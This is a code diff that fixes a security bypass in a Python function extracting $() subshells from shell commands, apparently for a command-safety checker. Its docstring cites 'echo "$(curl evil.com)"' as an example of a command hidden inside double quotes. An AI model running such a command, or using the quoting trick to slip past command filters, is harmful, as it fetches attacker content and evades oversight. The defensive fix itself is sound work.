@@ -64,9 +64,16 @@ def _extract_dollar_subshells(command: str) -> list[str]:
     """Extract all $() subshell contents using balanced parenthesis counting.
 
     This properly handles nested subshells like $(echo $(ls)) by counting
-    parentheses to find matching pairs.  Parentheses inside single- or
-    double-quoted strings and escaped characters are skipped so that a
-    command like ``echo "$(echo ")")"`` does not confuse the parser.
+    parentheses to find matching pairs.
+
+    Quoting rules (POSIX):
+    - Single-quoted strings (``'...'``) suppress ALL expansion — ``$(...)``
+      inside single quotes is never executed, so we skip over them entirely.
+    - Double-quoted strings (``"..."``) still allow subshell expansion, so
+      we must continue scanning through them for ``$(`` — skipping them would
+      create a security bypass (e.g. ``echo "$(curl evil.com)"`` would evade
+      detection if we skipped the double-quoted region).
+
     Returns a list of inner command strings.
     """
     results: list[str] = []
@@ -74,7 +81,6 @@ def _extract_dollar_subshells(command: str) -> list[str]:
     length = len(command)
 
     while i < length:
-        # Skip over quoted regions so we don't miscount parentheses inside them.
         ch = command[i]
 
         if ch == "\\" and i + 1 < length:
@@ -82,20 +88,14 @@ def _extract_dollar_subshells(command: str) -> list[str]:
             i += 2
             continue
 
-        if ch in ('"', "'"):
-            # Advance past the entire quoted string.
-            quote = ch
+        # Only skip SINGLE-quoted strings: inside '...' no expansion occurs.
+        # Do NOT skip double-quoted strings — $(...) is still expanded inside "...".
+        if ch == "'":
             i += 1
-            while i < length:
-                c = command[i]
-                if c == "\\" and quote == '"' and i + 1 < length:
-                    # Backslash escape inside double-quoted string.
-                    i += 2
-                    continue
-                if c == quote:
-                    i += 1
-                    break
+            while i < length and command[i] != "'":
                 i += 1
+            if i < length:
+                i += 1  # skip closing single-quote
             continue
 
         # Look for $(
